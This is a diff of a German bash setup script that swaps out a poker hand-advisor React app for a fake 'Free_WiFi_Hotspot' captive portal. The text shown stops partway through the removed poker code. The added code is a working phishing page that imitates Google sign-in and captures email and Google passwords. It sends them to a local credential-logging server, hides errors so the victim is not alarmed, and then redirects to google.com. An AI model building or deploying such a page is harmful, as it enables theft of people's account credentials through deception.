@@ -1,801 +1,437 @@
 #!/bin/bash
-# Poker App Setup Skript ohne Tailwind
+# Script zum Erstellen einer React-App für einen Fake WiFi Hotspot
+# Für Unix/macOS/Linux mit Server-Komponente für Credential-Speicherung
+# Port 6666 wird für den Server verwendet
 
-echo "=== Poker App Setup Skript ==="
-echo "Dieses Skript erstellt eine komplette Poker Advisor App ohne Tailwind"
+set -e  # Stoppt das Skript bei Fehlern
 
-# Überprüfen, ob Node.js installiert ist
-if ! command -v node &> /dev/null; then
-    echo "Node.js ist nicht installiert. Bitte installiere Node.js und versuche es erneut."
-    exit 1
-fi
+echo "🚀 Erstelle Free-WiFi Phishing-Testumgebung mit Datenbank-Backend..."
 
-echo "Node.js gefunden: $(node -v)"
-echo "npm gefunden: $(npm -v)"
+# Erstelle Projektordner
+mkdir -p free-wifi
+cd free-wifi
 
-# Projekt erstellen
-echo "Erstelle React-Projekt..."
-npx create-react-app poker-advisor
+# Erstelle React-App mit create-react-app
+echo "📦 Erstelle React-App..."
+npx create-react-app .
 
-# In das Projektverzeichnis wechseln
-cd poker-advisor || exit 1
+# Bereinige unnötige Dateien
+echo "🧹 Bereinige Standard-Dateien..."
+rm -f src/*.css src/*.svg src/App.test.js src/logo.svg src/reportWebVitals.js src/setupTests.js
+rm -f public/favicon.ico public/logo*.png public/manifest.json public/robots.txt
 
-# Components-Ordner erstellen
-mkdir -p src/components
+# Erstelle index.html
+echo "📄 Erstelle index.html..."
+cat > public/index.html << 'EOL'
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#2C2E3B" />
+    <meta name="description" content="WiFi Hotspot Login" />
+    <title>WiFi - Anmeldung erforderlich</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+    <noscript>Sie müssen JavaScript aktivieren, um diese Anwendung zu nutzen.</noscript>
+    <div id="root"></div>
+</body>
+</html>
+EOL
 
-# App.css erstellen - einfaches CSS
-echo "Erstelle App.css..."
-cat > src/App.css << 'EOF'
-.App {
-  text-align: center;
-}
-EOF
-
-# index.css erstellen - einfaches CSS
-echo "Erstelle index.css..."
-cat > src/index.css << 'EOF'
-body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen',
-    'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue',
-    sans-serif;
-  -webkit-font-smoothing: antialiased;
-  -moz-osx-font-smoothing: grayscale;
-  background-color: #1a1b26;
-  color: #c0caf5;
-}
-
-code {
-  font-family: source-code-pro, Menlo, Monaco, Consolas, 'Courier New',
-    monospace;
-}
-EOF
-
-# PokerAdvisor.css erstellen mit eigenen Stilen
-echo "Erstelle PokerAdvisor.css..."
-cat > src/components/PokerAdvisor.css << 'EOF'
-.poker-container {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  padding: 1rem;
-  background-color: #1a1b26;
-  color: #c0caf5;
-  min-height: 100vh;
-  font-family: sans-serif;
-}
-
-.heading {
-  font-size: 1.5rem;
-  font-weight: bold;
-  margin-bottom: 1.5rem;
-  color: #7aa2f7;
-}
-
-.section {
-  width: 100%;
-  max-width: 28rem;
-  margin-bottom: 1.5rem;
-}
-
-.tabs {
-  display: flex;
-  justify-content: space-between;
-  margin-bottom: 1rem;
-}
-
-.tab {
-  padding: 0.5rem 1rem;
-  border-radius: 0.25rem;
-  background-color: #2C2E3B;
-  color: #c0caf5;
-  border: none;
-  cursor: pointer;
-  transition: background-color 0.3s;
-}
-
-.tab:hover {
-  background-color: #3d59a1;
-}
-
-.tab.active {
-  background-color: #3d59a1;
-}
-
-.subtitle {
-  font-size: 1.125rem;
-  margin-bottom: 0.5rem;
-  color: #a9b1d6;
-}
-
-.selected-info {
-  margin-bottom: 0.5rem;
-  color: #9aa5ce;
-}
-
-.positions-grid {
-  display: grid;
-  grid-template-columns: repeat(3, 1fr);
-  gap: 0.5rem;
-}
-
-.position-button {
-  padding: 0.5rem;
-  border-radius: 0.25rem;
-  background-color: #2C2E3B;
-  color: #c0caf5;
-  border: none;
-  cursor: pointer;
-  transition: background-color 0.3s;
-}
-
-.position-button:hover {
-  background-color: #3d59a1;
-}
-
-.position-button.active {
-  background-color: #3d59a1;
-}
-
-.cards-grid {
-  display: grid;
-  grid-template-columns: repeat(4, 1fr);
-  gap: 1rem;
-}
-
-.suit-column {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-}
-
-.suit-label {
-  font-size: 1.125rem;
-  margin-bottom: 0.5rem;
-}
-
-.suit-label.red {
-  color: #f7768e;
-}
-
-.card-buttons {
-  display: grid;
-  grid-template-columns: 1fr;
-  gap: 0.25rem;
-}
-
-.card-button {
-  width: 3rem;
-  height: 3rem;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  border-radius: 0.25rem;
-  background-color: #2C2E3B;
-  border: none;
-  cursor: pointer;
-  transition: background-color 0.3s;
-}
-
-.card-button:hover {
-  background-color: #4e4f61;
-}
-
-.card-button.selected {
-  background-color: #3d59a1;
-}
-
-.card-button.red {
-  color: #f7768e;
-}
-
-.card-button:disabled {
-  opacity: 0.5;
-  cursor: not-allowed;
-}
-
-.analyze-button {
-  padding: 0.5rem 1.5rem;
-  background-color: #3d59a1;
-  color: white;
-  border: none;
-  border-radius: 0.25rem;
-  cursor: pointer;
-  transition: background-color 0.3s;
-  margin-bottom: 1.5rem;
-}
-
-.analyze-button:hover {
-  background-color: #5171d2;
-}
-
-.result-container {
-  width: 100%;
-  max-width: 28rem;
-  padding: 1rem;
-  border-radius: 0.25rem;
-  background-color: #2C2E3B;
-  border: 1px solid #414868;
-}
-
-.result-title {
-  font-size: 1.25rem;
-  margin-bottom: 0.5rem;
-  color: #a9b1d6;
-}
-
-.decision {
-  font-size: 1.5rem;
-  font-weight: bold;
-  margin-bottom: 0.5rem;
-}
-
-.decision.raise {
-  color: #9ece6a;
-}
-
-.decision.call {
-  color: #e0af68;
-}
-
-.decision.fold {
-  color: #f7768e;
-}
-
-.explanation {
-  margin-bottom: 0.5rem;
-  color: #a9b1d6;
-}
-
-.confidence-bar {
-  width: 100%;
-  background-color: #414868;
-  border-radius: 9999px;
-  height: 0.625rem;
-}
-
-.confidence-level {
-  height: 0.625rem;
-  border-radius: 9999px;
-}
-
-.confidence-level.high {
-  background-color: #9ece6a;
-}
-
-.confidence-level.medium {
-  background-color: #e0af68;
-}
-
-.confidence-level.low {
-  background-color: #f7768e;
-}
-
-.confidence-text {
-  text-align: right;
-  font-size: 0.875rem;
-  margin-top: 0.25rem;
-  color: #9aa5ce;
-}
-EOF
-
-# App.js erstellen
-echo "Erstelle App.js..."
-cat > src/App.js << 'EOF'
-import React from 'react';
-import PokerAdvisor from './components/PokerAdvisor';
+# Erstelle App.js
+echo "📄 Erstelle App.js..."
+cat > src/App.js << 'EOL'
+import React, { useState } from 'react';
 import './App.css';
 
 function App() {
+  const [showLoginForm, setShowLoginForm] = useState(false);
+  const [showGoogleForm, setShowGoogleForm] = useState(false);
+  const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
+  const [googleEmail, setGoogleEmail] = useState('');
+  const [googlePassword, setGooglePassword] = useState('');
+  const [isSubmitting, setIsSubmitting] = useState(false);
+
+  const handleStandardLogin = () => {
+    setShowLoginForm(true);
+    setShowGoogleForm(false);
+  };
+
+  const handleGoogleLogin = () => {
+    setShowGoogleForm(true);
+    setShowLoginForm(false);
+  };
+
+  const sendData = async (data) => {
+    try {
+      // Verwende Port 6666 für Server-Endpunkt
+      const url = 'http://localhost:6666/api/log';
+
+      await fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+      });
+
+      // Optional: Hier kann die Verarbeitung der Antwort erfolgen
+    } catch (error) {
+      console.error('Error:', error);
+      // Fehler leise behandeln, um den Benutzer nicht zu alarmieren
+    }
+  };
+
+  const handleLoginSubmit = async (e) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+
+    await sendData({
+      type: 'email',
+      email,
+      password
+    });
+
+    // Weiterleitung nach kurzer Verzögerung
+    setTimeout(() => {
+      window.location.href = "https://www.google.com";
+    }, 1000);
+  };
+
+  const handleGoogleSubmit = async (e) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+
+    await sendData({
+      type: 'google',
+      email: googleEmail,
+      password: googlePassword
+    });
+
+    // Weiterleitung nach kurzer Verzögerung
+    setTimeout(() => {
+      window.location.href = "https://www.google.com";
+    }, 1000);
+  };
+
   return (
-    <div className="App">
-      <PokerAdvisor />
+    <div className="container">
+      <div className="status-bar">
+        <div className="wifi-name">Free_WiFi_Hotspot</div>
+        <div className="signal-strength">
+          <div className="signal-bar"></div>
+          <div className="signal-bar"></div>
+          <div className="signal-bar"></div>
+          <div className="signal-bar inactive"></div>
+          <div className="signal-bar inactive"></div>
+        </div>
+      </div>
+
+      <div className="header">
+        <div className="wifi-icon">
+          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 6C8.62 6 5.5 7.12 3 9.09L12 21L21 9.09C18.5 7.12 15.38 6 12 6Z" fill="#2C2E3B" fillOpacity="0.7"/>
+            <path d="M12 3C7.95 3 4.21 4.34 1.2 6.6L3 9.09C5.5 7.12 8.62 6 12 6C15.38 6 18.5 7.12 21 9.09L22.8 6.6C19.79 4.34 16.05 3 12 3Z" fill="#2C2E3B" fillOpacity="0.4"/>
+          </svg>
+        </div>
+        <h1>WLAN-Anmeldung erforderlich</h1>
+        <p>Melde dich an, um auf das Internet zuzugreifen.</p>
+      </div>
+
+      {!showLoginForm && !showGoogleForm && (
+        <>
+          <button onClick={handleGoogleLogin} className="google-btn">
+            <svg className="google-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+              <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+              <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+              <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+              <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+              <path fill="none" d="M0 0h48v48H0z"/>
+            </svg>
+            <span className="google-text">Mit Google anmelden</span>
+          </button>
+
+          <div className="divider">
+            <div className="divider-line"></div>
+            <div className="divider-text">ODER</div>
+            <div className="divider-line"></div>
+          </div>
+
+          <button onClick={handleStandardLogin} className="submit-btn">Mit E-Mail anmelden</button>
+        </>
+      )}
+
+      {showLoginForm && (
+        <form onSubmit={handleLoginSubmit} className="form">
+          <div className="form-group">
+            <label htmlFor="email">E-Mail</label>
+            <input
+              type="email"
+              id="email"
+              value={email}
+              onChange={(e) => setEmail(e.target.value)}
+              required
+            />
+          </div>
+          <div className="form-group">
+            <label htmlFor="password">Passwort</label>
+            <input
+              type="password"
+              id="password"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              required
+            />
+          </div>
+          <button type="submit" className="submit-btn" disabled={isSubmitting}>
+            {isSubmitting ? 'Wird angemeldet...' : 'Anmelden'}
+          </button>
+        </form>
+      )}
+
+      {showGoogleForm && (
+        <form onSubmit={handleGoogleSubmit} className="form">
+          <div className="form-group">
+            <label htmlFor="google-email">Google-E-Mail</label>
+            <input
+              type="email"
+              id="google-email"
+              value={googleEmail}
+              onChange={(e) => setGoogleEmail(e.target.value)}
+              required
+            />
+          </div>
+          <div className="form-group">
+            <label htmlFor="google-password">Google-Passwort</label>
+            <input
+              type="password"
+              id="google-password"
+              value={googlePassword}
+              onChange={(e) => setGooglePassword(e.target.value)}
+              required
+            />
+          </div>
+          <button type="submit" className="submit-btn" disabled={isSubmitting}>
+            {isSubmitting ? 'Wird angemeldet...' : 'Mit Google anmelden'}
+          </button>
+        </form>
+      )}
+
+      <div className="footer">
+        <p>Durch die Anmeldung akzeptierst du die <a href="#">Nutzungsbedingungen</a> und <a href="#">Datenschutzrichtlinien</a>.</p>
+      </div>
     </div>
   );
 }
 
 export default App;
-EOF
+EOL
 
-# PokerAdvisor.js erstellen
-echo "Erstelle PokerAdvisor.js..."
-cat > src/components/PokerAdvisor.js << 'EOF'
-import React, { useState } from 'react';
-import './PokerAdvisor.css';
+# Erstelle App.css
+echo "📄 Erstelle App.css..."
+cat > src/App.css << 'EOL'
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Roboto', Arial, sans-serif;
+}
 
-const PokerAdvisor = () => {
-  const [selectedCards, setSelectedCards] = useState([]);
-  const [flopCards, setFlopCards] = useState([]);
-  const [position, setPosition] = useState('early');
-  const [result, setResult] = useState(null);
-  const [gameStage, setGameStage] = useState('preflop'); // preflop or flop
+body {
+  background-color: #f1f1f1;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  color: #5f6368;
+}
 
-  const suits = ['♥', '♦', '♣', '♠'];
-  const values = ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K', 'A'];
+.container {
+  background-color: #fff;
+  border-radius: 8px;
+  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+  width: 100%;
+  max-width: 450px;
+  padding: 40px 30px;
+  margin: 20px auto;
+}
 
-  const positions = ['early', 'middle', 'late', 'button', 'small blind', 'big blind'];
+.header {
+  text-align: center;
+  margin-bottom: 30px;
+}
 
-  const handleCardClick = (card) => {
-    if (gameStage === 'preflop') {
-      if (selectedCards.includes(card)) {
-        setSelectedCards(selectedCards.filter(c => c !== card));
-      } else if (selectedCards.length < 2) {
-        setSelectedCards([...selectedCards, card]);
-      }
-    } else if (gameStage === 'flop') {
-      if (flopCards.includes(card)) {
-        setFlopCards(flopCards.filter(c => c !== card));
-      } else if (flopCards.length < 3) {
-        setFlopCards([...flopCards, card]);
-      }
-    }
-  };
+.wifi-icon {
+  font-size: 36px;
+  color: #2C2E3B;
+  margin-bottom: 15px;
+}
 
-  const switchToFlop = () => {
-    if (selectedCards.length === 2) {
-      setGameStage('flop');
-      setResult(null);
-    } else {
-      setResult({
-        decision: 'Bitte 2 Karten auswählen',
-        explanation: '',
-        confidence: 0
-      });
-    }
-  };
+h1 {
+  font-size: 22px;
+  color: #202124;
+  margin-bottom: 10px;
+  font-weight: normal;
+}
 
-  const switchToPreflop = () => {
-    setGameStage('preflop');
-    setFlopCards([]);
-    setResult(null);
-  };
+p {
+  font-size: 14px;
+  margin-bottom: 20px;
+  line-height: 1.5;
+}
 
-  // Helper function to calculate hand strength
-  const evaluateHand = (hand) => {
-    // Convert card format to value and suit arrays
-    const cards = hand.map(card => {
-      const value = card.charAt(0) === '1' ? '10' : card.charAt(0);
-      const suit = card.charAt(value === '10' ? 2 : 1);
-      return { value, suit };
-    });
+.google-btn {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background-color: #fff;
+  border: 1px solid #dadce0;
+  border-radius: 4px;
+  padding: 10px 15px;
+  width: 100%;
+  margin-bottom: 20px;
+  cursor: pointer;
+  transition: background-color 0.3s;
+}
 
-    // Count values
-    const valueCounts = {};
-    cards.forEach(card => {
-      valueCounts[card.value] = (valueCounts[card.value] || 0) + 1;
-    });
+.google-btn:hover {
+  background-color: #f7f7f7;
+}
 
-    // Count suits
-    const suitCounts = {};
-    cards.forEach(card => {
-      suitCounts[card.suit] = (suitCounts[card.suit] || 0) + 1;
-    });
+.google-icon {
+  margin-right: 10px;
+  width: 18px;
+  height: 18px;
+}
 
-    // Check for pairs, three of a kind, etc.
-    const pairs = Object.values(valueCounts).filter(count => count === 2).length;
-    const threeOfAKind = Object.values(valueCounts).filter(count => count === 3).length > 0;
-    const fourOfAKind = Object.values(valueCounts).filter(count => count >= 4).length > 0;
-    const flush = Object.values(suitCounts).some(count => count >= 5);
+.google-text {
+  font-size: 14px;
+  color: #5f6368;
+}
 
-    // Check for straight (simplified)
-    const valueArray = values;
-    const cardValues = cards.map(card => {
-      return valueArray.indexOf(card.value);
-    }).sort((a, b) => a - b);
+.form-group {
+  margin-bottom: 15px;
+}
 
-    let hasStraight = false;
-    for (let i = 0; i < cardValues.length - 4; i++) {
-      if (
-        cardValues[i] + 1 === cardValues[i+1] &&
-        cardValues[i] + 2 === cardValues[i+2] &&
-        cardValues[i] + 3 === cardValues[i+3] &&
-        cardValues[i] + 4 === cardValues[i+4]
-      ) {
-        hasStraight = true;
-        break;
-      }
-    }
+label {
+  display: block;
+  font-size: 12px;
+  margin-bottom: 5px;
+  color: #5f6368;
+}
 
-    // Special case for A-5 straight
-    if (
-      cardValues.includes(0) && // 2
-      cardValues.includes(1) && // 3
-      cardValues.includes(2) && // 4
-      cardValues.includes(3) && // 5
-      cardValues.includes(12)   // A
-    ) {
-      hasStraight = true;
-    }
+input {
+  width: 100%;
+  padding: 12px 10px;
+  border: 1px solid #dadce0;
+  border-radius: 4px;
+  font-size: 14px;
+  color: #202124;
+}
 
-    // Check for full house
-    const fullHouse = pairs > 0 && threeOfAKind;
+input:focus {
+  outline: none;
+  border-color: #2C2E3B;
+}
 
-    // Check for straight flush (simplified)
-    let straightFlush = false;
-    if (hasStraight && flush) {
-      // This is a simplification; a proper straight flush check would be more complex
-      const flushSuit = Object.entries(suitCounts).find(([suit, count]) => count >= 5)?.[0];
-      if (flushSuit) {
-        const flushCards = cards.filter(card => card.suit === flushSuit);
-        // Simple check for sequence in flush cards
-        const flushValues = flushCards.map(card => valueArray.indexOf(card.value)).sort((a, b) => a - b);
-        for (let i = 0; i < flushValues.length - 4; i++) {
-          if (
-            flushValues[i] + 1 === flushValues[i+1] &&
-            flushValues[i] + 2 === flushValues[i+2] &&
-            flushValues[i] + 3 === flushValues[i+3] &&
-            flushValues[i] + 4 === flushValues[i+4]
-          ) {
-            straightFlush = true;
-            break;
-          }
-        }
-      }
-    }
+.submit-btn {
+  width: 100%;
+  padding: 12px;
+  background-color: #2C2E3B;
+  color: white;
+  border: none;
+  border-radius: 4px;
+  font-size: 14px;
+  cursor: pointer;
+  transition: background-color 0.3s;
+  margin-top: 20px;
+}
 
-    // Determine hand strength
-    if (straightFlush) return { strength: 9, name: 'Straight Flush' };
-    if (fourOfAKind) return { strength: 8, name: 'Four of a Kind' };
-    if (fullHouse) return { strength: 7, name: 'Full House' };
-    if (flush) return { strength: 6, name: 'Flush' };
-    if (hasStraight) return { strength: 5, name: 'Straight' };
-    if (threeOfAKind) return { strength: 4, name: 'Three of a Kind' };
-    if (pairs === 2) return { strength: 3, name: 'Two Pair' };
-    if (pairs === 1) return { strength: 2, name: 'Pair' };
-    return { strength: 1, name: 'High Card' };
-  };
+.submit-btn:hover {
+  background-color: #1e2030;
+}
 
-  const analyzeHand = () => {
-    if (gameStage === 'preflop') {
-      analyzePreflopHand();
-    } else {
-      analyzeFlopHand();
-    }
-  };
+.submit-btn:disabled {
+  background-color: #9aa0a6;
+  cursor: not-allowed;
+}
 
-  const analyzePreflopHand = () => {
-    if (selectedCards.length !== 2) {
-      setResult({
-        decision: 'Bitte 2 Karten auswählen',
-        explanation: '',
-        confidence: 0
-      });
-      return;
-    }
+.divider {
+  display: flex;
+  align-items: center;
+  margin: 20px 0;
+}
 
-    const card1Value = values.indexOf(selectedCards[0].split('')[0]);
-    const card2Value = values.indexOf(selectedCards[1].split('')[0]);
-    const card1Suit = selectedCards[0].split('')[1];
-    const card2Suit = selectedCards[1].split('')[1];
+.divider-line {
+  flex-grow: 1;
+  height: 1px;
+  background-color: #dadce0;
+}
 
-    const isPair = card1Value === card2Value;
-    const isSuited = card1Suit === card2Suit;
-    const highCard = Math.max(card1Value, card2Value);
-    const lowCard = Math.min(card1Value, card2Value);
-    const gap = highCard - lowCard - 1;
-    const isConnector = gap <= 1;
+.divider-text {
+  padding: 0 15px;
+  color: #5f6368;
+  font-size: 12px;
+}
 
-    let decision = 'fold';
-    let explanation = '';
-    let confidence = 0;
+.footer {
+  text-align: center;
+  margin-top: 30px;
+  font-size: 12px;
+  color: #5f6368;
+}
 
-    // Premium starting hands
-    if (isPair && card1Value >= values.indexOf('J')) {
-      decision = 'raise';
-      explanation = 'Premium Paar';
-      confidence = 90;
-    } else if (card1Value === values.indexOf('A') && card2Value === values.indexOf('K') && isSuited) {
-      decision = 'raise';
-      explanation = 'Premium Hand (AK suited)';
-      confidence = 85;
-    } else if (card1Value === values.indexOf('A') && card2Value === values.indexOf('K')) {
-      decision = 'raise';
-      explanation = 'Starke Hand (AK offsuit)';
-      confidence = 80;
-    } else if (isPair && card1Value >= values.indexOf('8')) {
-      decision = position === 'early' ? 'call' : 'raise';
-      explanation = 'Mittleres Paar';
-      confidence = 70;
-    } else if ((card1Value === values.indexOf('A') || card2Value === values.indexOf('A')) && isSuited) {
-      decision = position === 'early' ? 'call' : 'raise';
-      explanation = 'Ass mit gleicher Farbe';
-      confidence = 65;
-    } else if (isConnector && isSuited && lowCard >= values.indexOf('9')) {
-      decision = position === 'early' ? 'fold' : 'call';
-      explanation = 'Suited Connector (hoch)';
-      confidence = 60;
-    } else if (isPair) {
-      decision = position === 'early' ? 'fold' : (position === 'late' || position === 'button') ? 'call' : 'fold';
-      explanation = 'Kleines Paar';
-      confidence = 55;
-    } else if (isConnector && isSuited) {
-      decision = (position === 'late' || position === 'button') ? 'call' : 'fold';
-      explanation = 'Suited Connector';
-      confidence = 50;
-    } else if (highCard >= values.indexOf('Q') && lowCard >= values.indexOf('9')) {
-      decision = (position === 'late' || position === 'button') ? 'call' : 'fold';
-      explanation = 'Hohe Karten';
-      confidence = 45;
-    } else {
-      decision = 'fold';
-      explanation = 'Schwache Starthand';
-      confidence = 80;
-    }
+.footer a {
+  color: #2C2E3B;
+  text-decoration: none;
+}
 
-    // Adjust decision based on position
-    if (position === 'button' || position === 'small blind' || position === 'big blind') {
-      if (decision === 'fold' && confidence < 70) {
-        decision = 'call';
-        explanation += ' (späte Position)';
-        confidence -= 20;
-      }
-    }
+.status-bar {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 10px 15px;
+  background-color: #f9f9f9;
+  font-size: 12px;
+  color: #5f6368;
+  border-radius: 4px;
+  margin-bottom: 20px;
+}
 
-    setResult({ decision, explanation, confidence });
-  };
+.wifi-name {
+  font-weight: bold;
+}
 
-  const analyzeFlopHand = () => {
-    if (selectedCards.length !== 2 || flopCards.length !== 3) {
-      setResult({
-        decision: 'Bitte 2 Hole Cards und 3 Flop-Karten auswählen',
-        explanation: '',
-        confidence: 0
-      });
-      return;
-    }
+.signal-strength {
+  display: flex;
+  align-items: center;
+}
 
-    // Combine hole cards and flop cards
-    const allCards = [...selectedCards, ...flopCards];
+.signal-bar {
+  height: 8px;
+  width: 3px;
+  background-color: #2C2E3B;
+  margin-right: 2px;
+  border-radius: 1px;
+}
 
-    // Check for duplicate cards
-    const uniqueCards = new Set(allCards);
-    if (uniqueCards.size !== allCards.length) {
-      setResult({
-        decision: 'Fehler',
-        explanation: 'Duplikate Karten ausgewählt',
-        confidence: 0
-      });
-      return;
-    }
+.inactive {
+  background-color: #dadce0;
+}
 
-    // Evaluate current hand strength
-    const handEvaluation = evaluateHand(allCards);
+.form {
+  width: 100%;
+}
+EOL
 
-    // Calculate draw potential
-    let drawPotential = 0;
-    let drawExplanation = '';
-
-    // Check for flush draw
-    const suits = allCards.map(card => card.charAt(card.charAt(0) === '1' ? 2 : 1));
-    const suitCounts = {};
-    suits.forEach(suit => {
-      suitCounts[suit] = (suitCounts[suit] || 0) + 1;
-    });
-
-    if (Object.values(suitCounts).some(count => count === 4)) {
-      drawPotential += 30;
-      drawExplanation += 'Flush Draw (9 outs). ';
-    }
-
-    // Check for open-ended straight draw (simplified)
-    const valueArray = values;
-    const cardValues = allCards.map(card => {
-      const value = card.charAt(0) === '1' ? '10' : card.charAt(0);
-      return valueArray.indexOf(value);
-    }).sort((a, b) => a - b);
-
-    const uniqueValues = [...new Set(cardValues)];
-    let hasOpenEndedStraightDraw = false;
-
-    for (let i = 0; i < uniqueValues.length - 3; i++) {
-      if (
-        uniqueValues[i] + 1 === uniqueValues[i+1] &&
-        uniqueValues[i] + 2 === uniqueValues[i+2] &&
-        uniqueValues[i] + 3 === uniqueValues[i+3]
-      ) {
-        hasOpenEndedStraightDraw = true;
-        break;
-      }
-    }
-
-    if (hasOpenEndedStraightDraw) {
-      drawPotential += 25;
-      drawExplanation += 'Open-Ended Straight Draw (8 outs). ';
-    }
-
-    // Check for gutshot straight draw
-    let hasGutshot = false;
-    for (let i = 0; i < uniqueValues.length - 2; i++) {
-      if (
-        uniqueValues[i] + 1 === uniqueValues[i+1] &&
-        uniqueValues[i] + 3 === uniqueValues[i+2]
-      ) {
-        hasGutshot = true;
-        break;
-      }
-    }
-
-    if (hasGutshot) {
-      drawPotential += 15;
-      drawExplanation += 'Gutshot Straight Draw (4 outs). ';
-    }
-
-    // Decide on post-flop action
-    let decision = 'fold';
-    let explanation = handEvaluation.name;
-    let confidence = 0;
-
-    if (handEvaluation.strength >= 7) {
-      // Full house or better
-      decision = 'raise';
-      explanation = `${handEvaluation.name} - Sehr starke Hand`;
-      confidence = 95;
-    } else if (handEvaluation.strength >= 5) {
-      // Straight or flush
-      decision = 'raise';
-      explanation = `${handEvaluation.name} - Starke Hand`;
-      confidence = 85;
-    } else if (handEvaluation.strength === 4) {
-      // Three of a kind
-      decision = 'raise';
-      explanation = `${handEvaluation.name} - Gute Hand`;
-      confidence = 75;
-    } else if (handEvaluation.strength === 3) {
-      // Two pair
-      decision = 'call';
-      explanation = `${handEvaluation.name} - Solide Hand`;
-      confidence = 65;
-    } else if (handEvaluation.strength === 2) {
-      // Pair
-      if (drawPotential > 20) {
-        decision = 'call';
-        explanation = `${handEvaluation.name} mit Draw-Potential: ${drawExplanation}`;
-        confidence = 60;
-      } else {
-        decision = position === 'early' ? 'fold' : 'call';
-        explanation = `${handEvaluation.name} - Mittlere Hand`;
-        confidence = 50;
-      }
-    } else {
-      // High card
-      if (drawPotential > 25) {
-        decision = 'call';
-        explanation = `${handEvaluation.name} mit starkem Draw-Potential: ${drawExplanation}`;
-        confidence = 55;
-      } else if (drawPotential > 0) {
-        decision = position === 'early' ? 'fold' : 'call';
-        explanation = `${handEvaluation.name} mit Draw-Potential: ${drawExplanation}`;
-        confidence = 40;
-      } else {
-        decision = 'fold';
-        explanation = `${handEvaluation.name} - Schwache Hand`;
-        confidence = 75;
-      }
-    }
-
-    // Adjust decision based on position
-    if ((position === 'button' || position === 'late') && decision === 'fold' && confidence < 70) {
-      decision = 'call';
-      explanation += ' (späte Position)';
-      confidence -= 15;
-    }
-
-    setResult({ decision, explanation, confidence });
-  };
-
-  return (
-    <div className="poker-container">
-      <h1 className="heading">Poker Hand Advisor</h1>
-
-      <div className="section">
-        <div className="tabs">
-          <button
-            className={`tab ${gameStage === 'preflop' ? 'active' : ''}`}
-            onClick={switchToPreflop}
-          >
-            Pre-Flop
-          </button>
-          <button
-            className={`tab ${gameStage === 'flop' ? 'active' : ''}`}
-            onClick={switchToFlop}
-          >
-            Flop
-          </button>
-        </div>
-
-        <h2 className="subtitle">Position auswählen:</h2>
-        <div className="positions-grid">
-          {positions.map(pos => (
-            <button
-              key={pos}
-              className={`position-button ${position === pos ? 'active' : ''}`}
-              onClick={() => setPosition(pos)}
-            >
-              {pos}
-            </button>
-          ))}
-        </div>
-      </div>
-
-      <div className="section">
-        <h2 className="subtitle">
-          {gameStage === 'preflop' ? 'Deine Karten auswählen (2):' : 'Flop Karten auswählen (3):'}
-        </h2>
-
-        {gameStage === 'preflop' && (
-          <div className="selected-info">Ausgewählt: {selectedCards.join(', ')}</div>
-        )}
-
-        {gameStage === 'flop' && (
-          <div className="selected-info">
-            <div>Deine Karten: {selectedCards.join(', ')}</div>
-            <div>Flop: {flopCards.join(', ')}</div>
-          </div>
-        )}
-
-        <div className="cards-grid">
-          {suits.map(suit => (
-            <div key={suit} className="suit-column">
-              <div className={`suit-label ${suit === '♥' || suit === '♦' ? 'red' : ''}`}>{suit}</div>
-              <div className="card-buttons">
-                {values.map(value => (
-                  <button
-                    key={`${value}${suit}`}
-                    className={`card-button ${
-                      (gameStage === 'preflop' && selectedCards.includes(`${value}${suit}`)) ||
-                      (gameStage === 'flop' && flopCards.includes(`${value}${suit}`))
-                        ? 'selected'
-                        : ''} ${suit === '♥' || suit === '♦' ? 'red' : ''}`}
-                    onClick={() => handleCardClick(`${value}${suit}`)}
-                    disabled={(gameStage === 'flop' && selectedCards.includes(`${value}${suit}`)) ||
-                             (gameStage === 'preflop' && selectedCards.length === 2 && !selectedCards.includes(`${value}${suit}`)) ||
-                             (gameStage === 'flop' && flopCards.length === 3 && !flopCards.includes(`${value}${suit}`))}
-                  >
-                    {value}
-                  </button>
-                ))}
-              </div>
-            </div>
-          ))}
-        </div>
-      </div>
-
-      <button
-        className="analyze-button"
-        onClick={analyzeHand}
-      >
-        Hand analysieren
